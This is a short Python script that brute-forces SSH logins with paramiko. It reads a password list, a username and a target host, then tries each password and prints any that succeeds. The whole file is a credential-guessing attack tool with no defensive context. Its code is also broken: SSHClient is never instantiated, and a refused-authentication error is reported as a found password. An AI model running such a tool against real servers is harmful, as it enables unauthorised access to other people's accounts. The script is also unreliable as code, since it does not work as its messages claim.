import os
import paramiko
import socket
import sys
import termcolor
import pyfiglet

Banner = pyfiglet.figlet_format("Brute Forcer")
print(Banner)
password = input("[+] Enter the passwords file: ")
user = input("[+] Enter the username: ")
host = input("[+] Enter the target website in the format www.website.com: ")


def ssh_connect(p, code=0):
    ssh = paramiko.SSHClient
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # initializes an object called SSH

    try:
        ssh.connect(host, port=22, username=user, password=p)  # Call password p because we used it above
    except paramiko.BadAuthenticationType: # If the website doesn't take something, lets say it only accepts
        # public key, this will catch that.
        code = 0
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2
    except paramiko.BadHostKeyException:
        code = 3
    ssh.close()
    return code


# open the file with passwords

if not os.path.exists(password):
    print(termcolor.colored("[!] File not found or incorrect file path!", color='red'))
    sys.exit(1)

with open(password, 'r') as file:
    for line in file.readlines():
        password = line.strip()

        try:
            response = ssh_connect(password)

            if response == 0:
                print(termcolor.colored(('[-] Found Password: ' + password + ', For Account: ' + user), color='green'))
                break  # Exit code if you found the password.
            elif response == 1:
                print(termcolor.colored(('[!] Incorrect Login: ' + password), color='yellow'))
                # Print incorrect login if the username doesn't match
            elif response == 2:
                print(termcolor.colored('[!!] Can\'t connect', color='red'))
                sys.exit(1)
                # Exit the code if you can't connect, meaning probably something went wrong.
        except Exception as e:
            print(e)
            pass
# One exclamation mark means that it can probably be fixed, 2 exclamation marks mean that it's a system error.
